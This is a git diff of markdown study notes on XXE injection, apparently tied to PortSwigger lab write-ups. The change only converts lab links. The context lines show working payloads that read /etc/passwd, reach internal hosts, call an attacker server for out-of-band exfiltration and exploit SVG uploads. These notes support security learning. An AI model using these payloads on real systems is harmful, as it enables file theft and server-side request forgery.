@@ -22,17 +22,17 @@ modify as such:
 	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 	<stockCheck><productId>&xxe;</productId></stockCheck>
 	```
-Lab: [[Exploiting XXE using external entities to retrieve files]]
+Lab: [Exploiting XXE using external entities to retrieve files](../../../../writeups/portswigger/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files.md)
 # Exploiting XXE To Perform SSRF
 use the following:
 	`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
 then use the defined entity `xxe` within a data value
-Lab: [[Exploiting XXE to perform SSRF attacks]]
+Lab: [Exploiting XXE to perform SSRF attacks](../../../../writeups/portswigger/Exploiting%20XXE%20to%20perform%20SSRF%20attacks.md)
 # Blind XXE
 - use OAST techniques
 	- make a back-end request to a server you control
 		`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`
-Lab: [[Blind XXE with out-of-band interaction]]
+Lab: [Blind XXE with out-of-band interaction](../../../../writeups/portswigger/Blind%20XXE%20with%20out-of-band%20interaction.md)
 ## Blind XXE Using Parameter Entities
 - sometimes regular entities are not allowed due to input validation 
 	- use parameter entities instead
@@ -70,7 +70,7 @@ The attacker hosts this malicious DTD on a server under their control, typically
 	```
 - This payload defines an XML parameter entity `%xxe` and incorporates it within the DTD. When processed by an XML parser, this payload fetches the external DTD from the attacker's server. 
 - The parser then interprets the DTD inline, executing the steps outlined in the malicious DTD and leading to the exfiltration of the `/etc/hostname` file to the attacker's server.
-Lab: [[Exploiting blind XXE to exfiltrate data using a malicious external DTD]]
+Lab: [Exploiting blind XXE to exfiltrate data using a malicious external DTD](../../../../writeups/portswigger/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD.md)
 ## Exploiting Blind XXE To Retrieve Data Via Error Messages
 - malicious DTD as follows:
 		```xml
@@ -90,7 +90,7 @@ The malicious DTD is invoked with the following:
 	<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
 	```
 
-Lab: [[Exploiting blind XXE to retrieve data via error messages]]
+Lab: [Exploiting blind XXE to retrieve data via error messages](../../../../writeups/portswigger/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages.md)
 # Finding Hidden Attack Surface For XXE Injections
 ## `XInclude`
 - when integrating client data into server-side XML documents, like those in backend SOAP requests, direct control over the XML structure is often limited, hindering traditional XXE attacks due to restrictions on modifying the `DOCTYPE` element
@@ -99,7 +99,7 @@ Lab: [[Exploiting blind XXE to retrieve data via error messages]]
 	```xml 
 	productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
 	```
-Lab: [[Exploiting XInclude to retrieve files]]
+Lab: [Exploiting XInclude to retrieve files](../../../../writeups/portswigger/Exploiting%20XInclude%20to%20retrieve%20files.md)
 ## File Uploads
 - files uploaded by users which are then processed on the server, can exploit vulnerabilities in how XML or XML-containing file formats are handled
 	- SVG or DOCX files 
@@ -112,4 +112,4 @@ OR
 	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 	```
 Latter is recommended. Paste this into a `.svg` file
-Lab: [[Exploiting XXE via image file upload]]
+Lab: [Exploiting XXE via image file upload](../../../../writeups/portswigger/Exploiting%20XXE%20via%20image%20file%20upload.md)
